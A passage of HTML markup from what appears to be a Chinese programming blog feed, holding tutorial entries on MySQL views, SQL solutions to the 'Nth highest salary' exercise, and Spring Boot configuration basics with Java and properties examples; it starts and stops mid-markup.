plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">//在单表上创建视图,重新创建student表，插入数据</span><br><span class="line">create table student(</span><br><span class="line">  id int not null primary key auto_increment,</span><br><span class="line">  name varchar(10) not null,</span><br><span class="line">  math float,</span><br><span class="line">  chinese float</span><br><span class="line">);</span><br><span class="line">insert into student(name,math,chinese) values</span><br><span class="line">(&#x27;howie1&#x27;,66,77),</span><br><span class="line">(&#x27;howie2&#x27;,66,77),</span><br><span class="line">(&#x27;howie3&#x27;,66,77);</span><br><span class="line">//开始创建视图</span><br><span class="line">create view stu_view as select math,chinese,math+chinese from student;  -- 下图可看出创建成功</span><br><span class="line">//也可以创建自定义字段名称的视图</span><br><span class="line">create view stu_view2(math,chin,sum) as select math,chinese,math+chinese from student;</span><br><span class="line"></span><br><span class="line">//在多表上创建视图，创建表stu_info，插入数据</span><br><span class="line">create table stu_info(</span><br><span class="line">  id int not null primary key auto_increment,</span><br><span class="line">  class varchar(10) not null,</span><br><span class="line">  addr varchar(100)</span><br><span class="line">);</span><br><span class="line">insert into stu_info(class,addr) values</span><br><span class="line">(&#x27;1&#x27;,&#x27;anhui&#x27;),</span><br><span class="line">(&#x27;2&#x27;,&#x27;fujian&#x27;),</span><br><span class="line">(&#x27;3&#x27;,&#x27;guangdong&#x27;);</span><br><span class="line">//创建视图stu_class</span><br><span class="line">create view stu_class(id,name,class) as </span><br><span class="line">select student.id,student.name,stu_info.class from </span><br><span class="line">student,stu_info where student.id=stu_info.id;</span><br><span class="line">//查看视图</span><br><span class="line">desc stu_class;</span><br><span class="line">show table status like &#x27;stu_class&#x27;\G</span><br><span class="line">show create view stu_class\G</span><br><span class="line">//修改视图</span><br><span class="line">create or replace view stu_view as select * from student;</span><br><span class="line">alter view stu_view as select chinese from student;</span><br><span class="line">//更新视图</span><br><span class="line">update stu_view set chinese=100;</span><br><span class="line">insert into student values(null,&#x27;haha&#x27;,100,100);</span><br><span class="line">delete from stu_view2 where math=100;</span><br><span class="line">//删除视图</span><br><span class="line">drop view if exists stu_view2;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mysql习题——第N高的薪水</title>
    <link href="/2023/06/18/Mysql%E4%B9%A0%E9%A2%98%E2%80%94%E2%80%94%E7%AC%ACN%E9%AB%98%E7%9A%84%E8%96%AA%E6%B0%B4/"/>
    <url>/2023/06/18/Mysql%E4%B9%A0%E9%A2%98%E2%80%94%E2%80%94%E7%AC%ACN%E9%AB%98%E7%9A%84%E8%96%AA%E6%B0%B4/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>表: Employee</p><table><thead><tr><th>Column Name</th><th>Type</th></tr></thead><tbody><tr><td>id</td><td>int</td></tr><tr><td>salary</td><td>int</td></tr></tbody></table><p>Id是该表的主键列。<br>该表的每一行都包含有关员工工资的信息。</p><p>编写一个SQL查询来报告 Employee 表中第 n 高的工资。如果没有第 n 个最高工资，查询应该报告为 null 。</p><p>查询结果格式如下所示。</p><p>示例 1:</p><p>输入:<br>Employee table:<br>+—-+——–+<br>| id | salary |<br>+—-+——–+<br>| 1  | 100    |<br>| 2  | 200    |<br>| 3  | 300    |<br>+—-+——–+<br>n &#x3D; 2<br>输出:<br>+————————+<br>| getNthHighestSalary(2) |<br>+————————+<br>| 200                    |<br>+————————+</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>排名是数据库中的一个经典题目，实际上又根据排名的具体细节可分为3种场景：</p><ol><li>连续排名，例如薪水3000、2000、2000、1000排名结果为1-2-3-4，体现同薪不同名，排名类似于编号</li><li>同薪同名但总排名不连续，例如同样的薪水分布，排名结果为1-2-2-4</li><li>同薪同名且总排名连续，同样的薪水排名结果为1-2-2-3</li></ol><p>不同的应用场景可能需要不同的排名结果，也意味着不同的查询策略。本题的目标是实现第三种排名方式下的第N个结果，且是全局排名，不存在分组的问题，实际上还要相对简单一些。</p><p><strong>思路1：单表查询</strong></p><p>由于本题不存在分组排序，只需返回全局第N高的一个，所以自然想到的想法是用order by排序加limit限制得到。需要注意两个细节：</p><p>同薪同名且不跳级的问题，解决办法是用group by按薪水分组后再order by<br>排名第N高意味着要跳过N-1个薪水，由于无法直接用limit N-1，所以需先在函数开头处理N为N&#x3D;N-1。<br>注：这里不能直接用limit N-1是因为limit和offset字段后面只接受正整数（意味着0、负数、小数都不行）或者单一变量（意味着不能用表达式），也就是说想取一条，limit 2-1、limit 1.1这类的写法都是报错的。<br>注：这种解法形式最为简洁直观，但仅适用于查询全局排名问题，如果要求各分组的每个第N名，则该方法不适用；而且也不能处理存在重复值的情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION getNthHighestSalary(N INT) RETURNS INT</span><br><span class="line">BEGIN</span><br><span class="line">    SET N := N-1;</span><br><span class="line">  RETURN (</span><br><span class="line">      # Write your MySQL query statement below.</span><br><span class="line">      SELECT </span><br><span class="line">            salary</span><br><span class="line">      FROM </span><br><span class="line">            employee</span><br><span class="line">      GROUP BY </span><br><span class="line">            salary</span><br><span class="line">      ORDER BY </span><br><span class="line">            salary DESC</span><br><span class="line">      LIMIT N, 1</span><br><span class="line">  );</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p><strong>思路2：子查询</strong></p><p>排名第N的薪水意味着该表中存在N-1个比其更高的薪水<br>注意这里的N-1个更高的薪水是指去重后的N-1个，实际对应人数可能不止N-1个<br>最后返回的薪水也应该去重，因为可能不止一个薪水排名第N<br>由于对于每个薪水的where条件都要执行一遍子查询，注定其效率低下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION getNthHighestSalary(N INT) RETURNS INT</span><br><span class="line">BEGIN</span><br><span class="line">  RETURN (</span><br><span class="line">      # Write your MySQL query statement below.</span><br><span class="line">      SELECT </span><br><span class="line">          DISTINCT e.salary</span><br><span class="line">      FROM </span><br><span class="line">          employee e</span><br><span class="line">      WHERE </span><br><span class="line">          (SELECT count(DISTINCT salary) FROM employee WHERE salary&gt;e.salary) = N-1);</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p><strong>思路3：自连接</strong></p><p>一般来说，能用子查询解决的问题也能用连接解决。具体到本题：</p><p>两表自连接，连接条件设定为表1的salary小于表2的salary<br>以表1的salary分组，统计表1中每个salary分组后对应表2中salary唯一值个数，即去重<br>限定步骤2中having 计数个数为N-1，即实现了该分组中表1salary排名为第N个<br>考虑N&#x3D;1的特殊情形(特殊是因为N-1&#x3D;0，计数要求为0)，此时不存在满足条件的记录数，但仍需返回结果，所以连接用left join<br>如果仅查询薪水这一项值，那么不用left join当然也是可以的，只需把连接条件放宽至小于等于、同时查询个数设置为N即可。因为连接条件含等号，所以一定不为空，用join即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION getNthHighestSalary(N INT) RETURNS INT</span><br><span class="line">BEGIN</span><br><span class="line">  RETURN (</span><br><span class="line">      # Write your MySQL query statement below.</span><br><span class="line">      SELECT </span><br><span class="line">          e1.salary</span><br><span class="line">      FROM </span><br><span class="line">          employee e1 JOIN employee e2 ON e1.salary &lt;= e2.salary</span><br><span class="line">      GROUP BY </span><br><span class="line">          e1.salary</span><br><span class="line">      HAVING </span><br><span class="line">          count(DISTINCT e2.salary) = N</span><br><span class="line">  );</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p><strong>思路4：窗口函数</strong></p><p>实际上，在mysql8.0中有相关的内置函数，而且考虑了各种排名问题：</p><p><strong>row_number()</strong>: 同薪不同名，相当于行号，例如3000、2000、2000、1000排名后为1、2、3、4<br><strong>rank()</strong>: 同薪同名，有跳级，例如3000、2000、2000、1000排名后为1、2、2、4<br><strong>dense_rank()</strong>: 同薪同名，无跳级，例如3000、2000、2000、1000排名后为1、2、2、3<br><strong>ntile()</strong>: 分桶排名，即首先按桶的个数分出第一二三桶，然后各桶内从1排名，实际不是很常用<br>显然，本题是要用第三个函数。<br>另外这三个函数必须要要与其搭档over()配套使用，over()中的参数常见的有两个，分别是<br>partition by，按某字段切分<br>order by，与常规order by用法一致，也区分ASC(默认)和DESC，因为排名总得有个依据<br>注：下面代码仅在mysql8.0以上版本可用，最新OJ已支持。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION getNthHighestSalary(N INT) RETURNS INT</span><br><span class="line">BEGIN</span><br><span class="line">  RETURN (</span><br><span class="line">      # Write your MySQL query statement below.</span><br><span class="line">        SELECT </span><br><span class="line">            DISTINCT salary</span><br><span class="line">        FROM </span><br><span class="line">            (SELECT </span><br><span class="line">                salary, dense_rank() over(ORDER BY salary DESC) AS rnk</span><br><span class="line">             FROM </span><br><span class="line">                employee) tmp</span><br><span class="line">        WHERE rnk = N</span><br><span class="line">  );</span><br><span class="line">END</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot框架</title>
    <link href="/2023/06/18/SpringBoot%E6%A1%86%E6%9E%B6/"/>
    <url>/2023/06/18/SpringBoot%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章-JavaConfig"><a href="#第一章-JavaConfig" class="headerlink" title="第一章  JavaConfig"></a>第一章  JavaConfig</h1><ol><li><p>为什么要使用 Spring Boot</p><p>因为Spring， SpringMVC 需要使用的大量的配置文件 （xml文件）</p><p>还需要配置各种对象，把使用的对象放入到spring容器中才能使用对象</p><p>需要了解其他框架配置规则。</p></li><li><p>SpringBoot 就相当于 不需要配置文件的Spring+SpringMVC。 常用的框架和第三方库都已经配置好了。</p><p>拿来就可以使用了。</p></li><li><p>SpringBoot开发效率高，使用方便多了</p></li></ol><h2 id="1-1-JavaConfig"><a href="#1-1-JavaConfig" class="headerlink" title="1.1 JavaConfig"></a>1.1 JavaConfig</h2><p>JavaConfig: 使用java类作为xml配置文件的替代， 是配置spring容器的纯java的方式。 在这个java类这可以创建java对象，把对象放入spring容器中（注入到容器）， </p><p>使用两个注解：</p><p>1）@Configuration ： 放在一个类的上面，表示这个类是作为配置文件使用的。</p><p>2）@Bean：声明对象，把对象注入到容器中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">例子：</span><br><span class="line"><span class="keyword">package</span> com.bjpowernode.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.bjpowernode.vo.Student;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Configuration:表示当前类是作为配置文件使用的。 就是用来配置容器的</span></span><br><span class="line"><span class="comment"> *       位置：在类的上面</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  SpringConfig这个类就相当于beans.xml</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建方法，方法的返回值是对象。 在方法的上面加入<span class="doctag">@Bean</span></span></span><br><span class="line"><span class="comment">     * 方法的返回值对象就注入到容器中。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Bean</span>: 把对象注入到spring容器中。 作用相当于&lt;bean&gt;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *     位置：方法的上面</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *     说明：<span class="doctag">@Bean</span>,不指定对象的名称，默认是方法名是 id</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Student <span class="title function_">createStudent</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        s1.setName(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        s1.setAge(<span class="number">26</span>);</span><br><span class="line">        s1.setSex(<span class="string">&quot;男&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> s1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/***</span></span><br><span class="line"><span class="comment">     * 指定对象在容器中的名称（指定&lt;bean&gt;的id属性）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Bean</span>的name属性，指定对象的名称（id）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean(name = &quot;lisiStudent&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Student <span class="title function_">makeStudent</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s2</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        s2.setName(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">        s2.setAge(<span class="number">22</span>);</span><br><span class="line">        s2.setSex(<span class="string">&quot;男&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> s2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-2-ImportResource"><a href="#1-2-ImportResource" class="headerlink" title="1.2 @ImportResource"></a>1.2 @ImportResource</h2><p>@ImportResource 作用导入其他的xml配置文件， 等于 在xml </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">resources</span>=<span class="string">&quot;其他配置文件&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ImportResource(value =&#123; &quot;classpath:applicationContext.xml&quot;,&quot;classpath:beans.xml&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringConfig</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-3-PropertyResource"><a href="#1-3-PropertyResource" class="headerlink" title="1.3 @PropertyResource"></a>1.3 @PropertyResource</h2><p>@PropertyResource: 读取properties属性配置文件。 使用属性配置文件可以实现外部化配置 ，</p><p>在程序代码之外提供数据。</p><p>步骤：</p><ol><li>在resources目录下，创建properties文件， 使用k&#x3D;v的格式提供数据</li><li>在PropertyResource 指定properties文件的位置</li><li>使用@Value（value&#x3D;”${key}”）</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ImportResource(value =&#123; &quot;classpath:applicationContext.xml&quot;,&quot;classpath:beans.xml&quot;&#125;)</span></span><br><span class="line"><span class="meta">@PropertySource(value = &quot;classpath:config.properties&quot;)</span></span><br><span class="line"><span class="meta">@ComponentScan(basePackages = &quot;com.bjpowernode.vo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringConfig</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第二章-Spring-Boot"><a href="#第二章-Spring-Boot" class="headerlink" title="第二章 Spring Boot"></a>第二章 Spring Boot</h1><h2 id="2-1-介绍"><a href="#2-1-介绍" class="headerlink" title="2.1 介绍"></a>2.1 介绍</h2><p>SpringBoot是Spring中的一个成员， 可以简化Spring，SpringMVC的使用。 他的核心还是IOC容器。</p><p>特点：</p><ul><li><p>Create stand-alone Spring applications</p><p> 创建spring应用</p></li><li><p>Embed Tomcat, Jetty or Undertow directly (no need to deploy WAR files)</p><p>内嵌的tomcat， jetty ， Undertow </p></li><li><p>Provide opinionated ‘starter’ dependencies to simplify your build configuration</p><p>提供了starter起步依赖，简化应用的配置。   </p><p>比如使用MyBatis框架 ， 需要在Spring项目中，配置MyBatis的对象 SqlSessionFactory ， Dao的代理对象</p><p>在SpringBoot项目中，在pom.xml里面, 加入一个 mybatis-spring-boot-starter依赖</p></li><li><p>Automatically configure Spring and 3rd party libraries whenever possible</p><p>尽可能去配置spring和第三方库。叫做自动配置（就是把spring中的，第三方库中的对象都创建好，放到容器中， 开发人员可以直接使用）</p></li><li><p>Provide production-ready features such as metrics, health checks, and externalized configuration</p><p> 提供了健康检查， 统计，外部化配置</p></li><li><p>Absolutely no code generation and no requirement for XML configuration</p><p>不用生成代码， 不用使用xml，做配置</p></li></ul><h2 id="2-2-创建Spring-Boot项目"><a href="#2-2-创建Spring-Boot项目" class="headerlink" title="2.2 创建Spring Boot项目"></a>2.2 创建Spring Boot项目</h2><h3 id="2-2-1-第一种方式，-使用Spring提供的初始化器，-就是向导创建SpringBoot应用"><a href="#2-2-1-第一种方式，-使用Spring提供的初始化器，-就是向导创建SpringBoot应用" class="headerlink" title="2.2.1 第一种方式， 使用Spring提供的初始化器， 就是向导创建SpringBoot应用"></a>2.2.1 第一种方式， 使用Spring提供的初始化器， 就是向导创建SpringBoot应用</h3><p>使用的地址： <a href="https://start.spring.io/">https://start.spring.io</a></p><p>SpringBoot项目的结构：<br><img src="/upload/2022/04/image-20210115152427829-d1ac9f1ee5d84b8f8e46d38a61e86225.png" alt="image20210115152427829.png"></p><h3 id="2-2-1-使用国内的地址"><a href="#2-2-1-使用国内的地址" class="headerlink" title="2.2.1  使用国内的地址"></a>2.2.1  使用国内的地址</h3><p><a href="https://start.springboot.io/">https://start.springboot.io</a></p><h2 id="2-3-注解的使用"><a href="#2-3-注解的使用" class="headerlink" title="2.3  注解的使用"></a>2.3  注解的使用</h2><p>@SpringBootApplication<br>复合注解：由<br>@SpringBootConfiguration<br>@EnableAutoConfiguration<br>@ComponentScan</p><p>1.@SpringBootConfiguration</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> SpringBootConfiguration &#123;</span><br><span class="line">    <span class="meta">@AliasFor(</span></span><br><span class="line"><span class="meta">        annotation = Configuration.class</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">proxyBeanMethods</span><span class="params">()</span> <span class="keyword">default</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：使用了@SpringBootConfiguration注解标注的类，可以作为配置文件使用的，<br>    可以使用Bean声明对象，注入到容器</p><p>2.@EnableAutoConfiguration</p><p>启用自动配置， 把java对象配置好，注入到spring容器中。例如可以把mybatis的对象创建好，放入到容器中</p><p>3.@ComponentScan</p><p> 扫描器，找到注解，根据注解的功能创建对象，给属性赋值等等。<br>默认扫描的包： @ComponentScan所在的类所在的包和子包。</p><h2 id="2-4-SpringBoot的配置文件"><a href="#2-4-SpringBoot的配置文件" class="headerlink" title="2.4 SpringBoot的配置文件"></a>2.4 SpringBoot的配置文件</h2><p>配置文件名称： application</p><p>扩展名有： properties( k&#x3D;v) ;  yml ( k: v)</p><p>使用application.properties,   application.yml</p><p>例1：application.properties设置 端口和上下文</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#设置端口号</span><br><span class="line">server.port=8082</span><br><span class="line">#设置访问应用上下文路径， contextpath</span><br><span class="line">server.servlet.context-path=/myboot</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>例2： application.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8083</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/myboot2</span></span><br></pre></td></tr></table></figure><h2 id="2-5-多环境配置"><a href="#2-5-多环境配置" class="headerlink" title="2.5 多环境配置"></a>2.5 多环境配置</h2><p>有开发环境， 测试环境， 上线的环境。</p><p>每个环境有不同的配置信息， 例如端口， 上下文件， 数据库url，用户名，密码等等</p><p>使用多环境配置文件，可以方便的切换不同的配置。</p><p>使用方式： 创建多个配置文件， 名称规则： application-环境名称.properties(yml)</p><p>创建开发环境的配置文件： application-dev.properties(  application-dev.yml )</p><p>创建测试者使用的配置： application-test.properties</p><h2 id="2-6-ConfigurationProperties"><a href="#2-6-ConfigurationProperties" class="headerlink" title="2.6 @ConfigurationProperties"></a>2.6 @ConfigurationProperties</h2><p>@ConfigurationProperties: 把配置文件的数据映射为java对象。</p><p>属性：prefix 配置文件中的某些key的开头的内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;school&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SchoolInfo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String website;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getWebsite</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> website;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setWebsite</span><span class="params">(String website)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.website = website;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAddress</span><span class="params">(String address)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;SchoolInfo&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, website=&#x27;&quot;</span> + website + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, address=&#x27;&quot;</span> + address + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>application.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置端口号</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">8082</span></span><br><span class="line"><span class="comment">#context-path</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/myboot</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#自定义key=value</span></span><br><span class="line"><span class="attr">school.name</span>=<span class="string">动力节点</span></span><br><span class="line"><span class="attr">school.website</span>=<span 